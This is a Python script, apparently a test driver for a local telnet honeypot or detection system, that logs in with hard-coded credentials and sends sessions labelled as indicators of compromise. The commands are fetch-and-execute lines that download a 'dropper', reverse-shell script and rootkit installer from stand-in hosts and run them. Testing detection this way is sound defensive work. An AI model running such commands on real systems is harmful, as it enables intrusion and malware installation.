#!/usr/bin/env python3
"""3 remaining IoC sessions with valid creds."""
import sys
sys.stdout.reconfigure(encoding="utf-8")
import socket, time

HOST, PORT = "127.0.0.1", 2323

def tn_connect():
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.settimeout(8)
    return s

def read_until(s, marker, timeout=4):
    buf = b""
    end = time.time() + timeout
    while time.time() < end:
        if marker in buf:
            return buf
        try:
            buf += s.recv(4096)
        except:
            break
    return buf

def read_eager(s, timeout=0.4):
    buf = b""
    end = time.time() + timeout
    while time.time() < end:
        try:
            buf += s.recv(4096)
        except:
            break
    return buf

def do_session(user, pwd, cmds, label):
    print(f"\n--- {label} ---")
    s = tn_connect()
    read_until(s, b"login:", 4)
    s.sendall(user.encode() + b"\r\n")
    time.sleep(0.2)
    read_until(s, b"Password:", 3)
    s.sendall(pwd.encode() + b"\r\n")
    time.sleep(0.6)
    r = read_eager(s, 0.5).decode("utf-8", "replace")
    time.sleep(0.5)
    r2 = read_eager(s, 0.5).decode("utf-8", "replace")
    full = r + r2
    if "Login incorrect" in full or "login:" in full:
        print("  FAIL")
        s.close()
        return
    print("  OK - executing cmds")
    for cmd in cmds:
        s.sendall(cmd.encode() + b"\r\n")
        time.sleep(0.6)
        out = read_eager(s, 0.5).decode("utf-8", "replace")
        lines = [l.strip() for l in out.split("\n") if l.strip()]
        print(f"  $ {cmd}")
        for l in lines[-2:]:
            print(f"    {l}")
    s.close()

# All with valid creds
do_session("admin", "test123",
    ["curl -o /tmp/backdoor.bin http://botnet.invalid/dropper", "python /tmp/backdoor.bin"],
    "ioc-curl-python")
time.sleep(1)

do_session("guest", "guest123",
    ["wget -q http://exploit.local/revsh -O /tmp/sh", "chmod 777 /tmp/sh", "bash /tmp/sh"],
    "ioc-wget-bash")
time.sleep(1)

do_session("admin", "test123",
    ["/bin/sh -c 'wget http://rootkit.invalid/install.sh && bash install.sh'"],
    "ioc-bin-sh")

print("\nALL DONE")
